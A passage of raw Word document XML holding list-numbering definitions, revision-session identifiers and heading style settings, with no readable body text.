      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%2."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="432" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%3."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="648" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%4."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="864"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right"/>
      <w:pPr>
        <w:ind w:left="1296" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%7."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1512" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%8."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1728" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%9."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="1944" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="5" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="12F61973"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="1C42743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5C6D62"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="40E861A8"/>
    <w:styleLink w:val="NumericList"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="216" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
        <w:color w:val="5D5356" w:themeColor="text1" w:themeTint="BF"/>
        <w:sz w:val="20"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%2."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="432" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%3."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="648" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%4."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="864"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right"/>
      <w:pPr>
        <w:ind w:left="1296" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%7."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1512" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%8."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1728" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%9."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="1944" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="7" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="14CC7ADA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="58587EEA"/>
    <w:numStyleLink w:val="XXXXXXXX"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="8" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="16F44AFB"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="58587EEA"/>
    <w:numStyleLink w:val="XXXXXXXX"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="9" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="24A80AE8"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="1E84F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21509"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="24A63B48"/>
    <w:lvl w:ilvl="0" w:tplc="61321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948B2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="58587EEA"/>
    <w:numStyleLink w:val="XXXXXXXX"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="12" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="29723756"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="58587EEA"/>
    <w:numStyleLink w:val="XXXXXXXX"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="13" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="2C0904CE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="58587EEA"/>
    <w:numStyleLink w:val="XXXXXXXX"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="14" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="32C027E6"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="58587EEA"/>
    <w:numStyleLink w:val="XXXXXXXX"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="15" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="35746F28"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="58587EEA"/>
    <w:numStyleLink w:val="XXXXXXXX"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="16" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="38247708"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="58587EEA"/>
    <w:numStyleLink w:val="XXXXXXXX"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="17" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="3BC65B4C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="AA38D0F8"/>
    <w:numStyleLink w:val="StyleNumbered10ptText1Left015Hanging015"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="18" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="3EDF3282"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="58587EEA"/>
    <w:numStyleLink w:val="XXXXXXXX"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="19" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="413978B3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="58587EEA"/>
    <w:numStyleLink w:val="XXXXXXXX"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="20" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="41EE7B49"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="09C8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C1952"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="58587EEA"/>
    <w:numStyleLink w:val="XXXXXXXX"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="22" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="4AAF56BD"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="9E907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24" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="4C702355"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="58587EEA"/>
    <w:numStyleLink w:val="XXXXXXXX"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="25" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="4F164BE8"/>
    <w:multiLevelType w:val="singleLevel"/>
    <w:tmpl w:val="F55EB134"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="Bullet1"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="576" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:color w:val="656263" w:themeColor="accent2"/>
        <w:position w:val="3"/>
        <w:sz w:val="16"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="26" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="52915BFE"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="B16039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146945"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A0A66A4A"/>
    <w:lvl w:ilvl="0" w:tplc="045A6E56">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
        <w:color w:val="5D5356"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9076A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="2AAE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171C2"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="EE40A37E"/>
    <w:lvl w:ilvl="0" w:tplc="A21C99E8">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="D3749C9C">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%2."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="75D006B2">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%3."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="2D86E130">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%4."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="785CF9A4">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%5."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="9AE6008E">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%6."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="C37C16F8">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%7."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="89C0F146">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%8."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="B1A8F142">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%9."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="30" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="644741D2"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="B75A8B44"/>
    <w:lvl w:ilvl="0" w:tplc="045A6E56">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
        <w:color w:val="5D5356"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0154B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="1BFE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2329A6"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="03844F3C"/>
    <w:lvl w:ilvl="0" w:tplc="0D363936">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="51B027C2" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%2."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="B1082D1A" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%3."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="91AAB3F2" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%4."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="BA1A2CCE" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%5."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="39641E4A" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%6."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="5D2CF508" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%7."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="C9E0482E" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%8."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="90CA3AA2" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%9."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="33" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="6F6E1BEE"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="770CA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29104E"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="47CC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42F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7EA11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F8B482F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="40E861A8"/>
    <w:numStyleLink w:val="NumericList"/>
  </w:abstractNum>
  <w:num w:numId="1">
    <w:abstractNumId w:val="35"/>
  </w:num>
  <w:num w:numId="2">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="3">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="4">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="5">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="6">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="7">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="8">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="9">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="10">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="11">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="12">
    <w:abstractNumId w:val="32"/>
  </w:num>
  <w:num w:numId="13">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="14">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="15">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="16">
    <w:abstractNumId w:val="36"/>
  </w:num>
  <w:num w:numId="17">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="18">
    <w:abstractNumId w:val="27"/>
  </w:num>
  <w:num w:numId="19">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="20">
    <w:abstractNumId w:val="37"/>
  </w:num>
  <w:num w:numId="21">
    <w:abstractNumId w:val="30"/>
  </w:num>
  <w:num w:numId="22">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="23">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="24">
    <w:abstractNumId w:val="33"/>
  </w:num>
  <w:num w:numId="25">
    <w:abstractNumId w:val="28"/>
  </w:num>
  <w:num w:numId="26">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="27">
    <w:abstractNumId w:val="29"/>
  </w:num>
  <w:num w:numId="28">
    <w:abstractNumId w:val="26"/>
  </w:num>
  <w:num w:numId="29">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="30">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="31">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="32">
    <w:abstractNumId w:val="31"/>
  </w:num>
  <w:num w:numId="33">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="34">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="35">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="36">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="37">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="38">
    <w:abstractNumId w:val="34"/>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cheffler">
    <w15:presenceInfo w15:providerId="None" w15:userId="Peter Scheff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2DE"/>
    <w:rsid w:val="0001315B"/>
    <w:rsid w:val="000374B3"/>
    <w:rsid w:val="000678AE"/>
    <w:rsid w:val="00084633"/>
    <w:rsid w:val="000E57FC"/>
    <w:rsid w:val="001047E5"/>
    <w:rsid w:val="00120778"/>
    <w:rsid w:val="001418E9"/>
    <w:rsid w:val="00144506"/>
    <w:rsid w:val="0016058D"/>
    <w:rsid w:val="00165FD3"/>
    <w:rsid w:val="001677BA"/>
    <w:rsid w:val="001835F6"/>
    <w:rsid w:val="001A642C"/>
    <w:rsid w:val="001B3C44"/>
    <w:rsid w:val="001B42DE"/>
    <w:rsid w:val="001C6BBD"/>
    <w:rsid w:val="001D6BCF"/>
    <w:rsid w:val="001F6147"/>
    <w:rsid w:val="002074B6"/>
    <w:rsid w:val="002217CA"/>
    <w:rsid w:val="00232EA8"/>
    <w:rsid w:val="00240F5A"/>
    <w:rsid w:val="002550AF"/>
    <w:rsid w:val="00260B28"/>
    <w:rsid w:val="0028304C"/>
    <w:rsid w:val="0028341D"/>
    <w:rsid w:val="002B3278"/>
    <w:rsid w:val="002B37F5"/>
    <w:rsid w:val="002C2D68"/>
    <w:rsid w:val="002D1A12"/>
    <w:rsid w:val="002D4309"/>
    <w:rsid w:val="002D7238"/>
    <w:rsid w:val="002E1859"/>
    <w:rsid w:val="00302B8C"/>
    <w:rsid w:val="00312E6B"/>
    <w:rsid w:val="0034589A"/>
    <w:rsid w:val="00346FAD"/>
    <w:rsid w:val="00372750"/>
    <w:rsid w:val="00382CF3"/>
    <w:rsid w:val="00387027"/>
    <w:rsid w:val="003A1ACF"/>
    <w:rsid w:val="003B20F4"/>
    <w:rsid w:val="003B3E0A"/>
    <w:rsid w:val="003C6A6C"/>
    <w:rsid w:val="003C78CE"/>
    <w:rsid w:val="00400E5B"/>
    <w:rsid w:val="00420693"/>
    <w:rsid w:val="00485D52"/>
    <w:rsid w:val="004A179B"/>
    <w:rsid w:val="004C1FB8"/>
    <w:rsid w:val="004E3EBC"/>
    <w:rsid w:val="00502D0F"/>
    <w:rsid w:val="00517EF1"/>
    <w:rsid w:val="00521D01"/>
    <w:rsid w:val="0052583B"/>
    <w:rsid w:val="00526315"/>
    <w:rsid w:val="00547D35"/>
    <w:rsid w:val="00565CE1"/>
    <w:rsid w:val="0057510C"/>
    <w:rsid w:val="005A211E"/>
    <w:rsid w:val="005D4A34"/>
    <w:rsid w:val="005D73A7"/>
    <w:rsid w:val="00615247"/>
    <w:rsid w:val="006168BA"/>
    <w:rsid w:val="00620AD5"/>
    <w:rsid w:val="0062345D"/>
    <w:rsid w:val="006263F6"/>
    <w:rsid w:val="00642A5F"/>
    <w:rsid w:val="00652B95"/>
    <w:rsid w:val="00655A98"/>
    <w:rsid w:val="00660844"/>
    <w:rsid w:val="00663934"/>
    <w:rsid w:val="00687896"/>
    <w:rsid w:val="006C6FD3"/>
    <w:rsid w:val="006D10EA"/>
    <w:rsid w:val="006E3419"/>
    <w:rsid w:val="00720D46"/>
    <w:rsid w:val="007333E4"/>
    <w:rsid w:val="00733EDE"/>
    <w:rsid w:val="00744A8B"/>
    <w:rsid w:val="007456B1"/>
    <w:rsid w:val="00756588"/>
    <w:rsid w:val="00760501"/>
    <w:rsid w:val="007615F3"/>
    <w:rsid w:val="00762544"/>
    <w:rsid w:val="00762802"/>
    <w:rsid w:val="007801BC"/>
    <w:rsid w:val="007A1A1E"/>
    <w:rsid w:val="007C4578"/>
    <w:rsid w:val="00814419"/>
    <w:rsid w:val="00815C26"/>
    <w:rsid w:val="008245A4"/>
    <w:rsid w:val="00827943"/>
    <w:rsid w:val="00855436"/>
    <w:rsid w:val="008555BA"/>
    <w:rsid w:val="00856751"/>
    <w:rsid w:val="00856D39"/>
    <w:rsid w:val="00861D8C"/>
    <w:rsid w:val="00882BB9"/>
    <w:rsid w:val="00882FA7"/>
    <w:rsid w:val="00886959"/>
    <w:rsid w:val="008B0C7D"/>
    <w:rsid w:val="008B517C"/>
    <w:rsid w:val="008E1100"/>
    <w:rsid w:val="008F2D6F"/>
    <w:rsid w:val="00904E7B"/>
    <w:rsid w:val="00916A29"/>
    <w:rsid w:val="00935C76"/>
    <w:rsid w:val="0096432B"/>
    <w:rsid w:val="0097417C"/>
    <w:rsid w:val="0099583C"/>
    <w:rsid w:val="009A2E75"/>
    <w:rsid w:val="009A41D5"/>
    <w:rsid w:val="009A738D"/>
    <w:rsid w:val="009D0882"/>
    <w:rsid w:val="009E6545"/>
    <w:rsid w:val="00A118C5"/>
    <w:rsid w:val="00A4529F"/>
    <w:rsid w:val="00A82DE0"/>
    <w:rsid w:val="00A857E1"/>
    <w:rsid w:val="00A86348"/>
    <w:rsid w:val="00A8684E"/>
    <w:rsid w:val="00AB6D64"/>
    <w:rsid w:val="00AD5676"/>
    <w:rsid w:val="00AD7CFB"/>
    <w:rsid w:val="00AE7F73"/>
    <w:rsid w:val="00B0048B"/>
    <w:rsid w:val="00B16A7C"/>
    <w:rsid w:val="00B20576"/>
    <w:rsid w:val="00B26E4D"/>
    <w:rsid w:val="00B426CA"/>
    <w:rsid w:val="00B46461"/>
    <w:rsid w:val="00B47953"/>
    <w:rsid w:val="00B6572D"/>
    <w:rsid w:val="00B9386C"/>
    <w:rsid w:val="00BA3D24"/>
    <w:rsid w:val="00BB26DB"/>
    <w:rsid w:val="00BB7BA4"/>
    <w:rsid w:val="00BE4783"/>
    <w:rsid w:val="00C0450F"/>
    <w:rsid w:val="00C10C03"/>
    <w:rsid w:val="00C13013"/>
    <w:rsid w:val="00C3001E"/>
    <w:rsid w:val="00C42029"/>
    <w:rsid w:val="00C51C03"/>
    <w:rsid w:val="00C72990"/>
    <w:rsid w:val="00C81748"/>
    <w:rsid w:val="00C92C1C"/>
    <w:rsid w:val="00C954FE"/>
    <w:rsid w:val="00CA11EB"/>
    <w:rsid w:val="00CA1332"/>
    <w:rsid w:val="00CB544B"/>
    <w:rsid w:val="00CB7EEB"/>
    <w:rsid w:val="00CC369E"/>
    <w:rsid w:val="00CC5DF8"/>
    <w:rsid w:val="00CD562A"/>
    <w:rsid w:val="00CD6ED7"/>
    <w:rsid w:val="00CE4C77"/>
    <w:rsid w:val="00CF2840"/>
    <w:rsid w:val="00D03517"/>
    <w:rsid w:val="00D03617"/>
    <w:rsid w:val="00D04158"/>
    <w:rsid w:val="00D1783D"/>
    <w:rsid w:val="00D4629D"/>
    <w:rsid w:val="00D4670D"/>
    <w:rsid w:val="00D629FA"/>
    <w:rsid w:val="00D75B04"/>
    <w:rsid w:val="00D953CA"/>
    <w:rsid w:val="00DA2322"/>
    <w:rsid w:val="00DA5A5A"/>
    <w:rsid w:val="00DC785C"/>
    <w:rsid w:val="00E060D0"/>
    <w:rsid w:val="00E1251E"/>
    <w:rsid w:val="00E62F2B"/>
    <w:rsid w:val="00EA3568"/>
    <w:rsid w:val="00EA579B"/>
    <w:rsid w:val="00EB31B0"/>
    <w:rsid w:val="00EB7C80"/>
    <w:rsid w:val="00ED04D6"/>
    <w:rsid w:val="00EF1708"/>
    <w:rsid w:val="00EF69B2"/>
    <w:rsid w:val="00EF772E"/>
    <w:rsid w:val="00F16655"/>
    <w:rsid w:val="00F47D73"/>
    <w:rsid w:val="00F5175D"/>
    <w:rsid w:val="00F72EDE"/>
    <w:rsid w:val="00F73B56"/>
    <w:rsid w:val="00F7687F"/>
    <w:rsid w:val="00F775E3"/>
    <w:rsid w:val="00FB4F2F"/>
    <w:rsid w:val="00FE191E"/>
    <w:rsid w:val="00FE3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77F993"/>
  <w15:docId w15:val="{3403EA1A-126A-42CD-B3FF-104D4D51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99"/>
    <w:semiHidden/>
    <w:qFormat/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading1">
    <w:name w:val="heading 1"/>
    <w:next w:val="Bodycopy"/>
    <w:link w:val="Heading1Char"/>
    <w:qFormat/>
    <w:pPr>
      <w:keepNext/>
      <w:spacing w:before="480" w:after="280" w:line="360" w:lineRule="exact"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
      <w:b/>
      <w:color w:val="231F20" w:themeColor="text1"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading2">
    <w:name w:val="heading 2"/>
    <w:next w:val="Bodycopy"/>
    <w:link w:val="Heading2Char"/>
    <w:qFormat/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="280" w:after="280" w:line="340" w:lineRule="exact"/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:color w:val="231F20" w:themeColor="text1"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="26"/>
    </w:rPr>
  </w:style>
